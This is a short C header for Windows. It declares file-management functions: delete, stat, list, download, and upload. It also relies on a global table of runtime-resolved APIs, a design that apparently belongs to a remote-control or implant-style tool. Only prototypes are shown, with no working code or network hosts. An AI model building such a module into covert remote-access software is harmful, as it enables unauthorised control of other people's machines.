#pragma once
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h>
#include <sys/stat.h>
#include "resolve_apis.h"

extern API Api;

int delete_file(char* path);
int delete_dir(char* path);
int get_object_info(char* path, struct stat* fileinfo);
char** get_file_list(const char* dirPath, int* numFiles);
void download_file();
void download_folder();
void upload_file();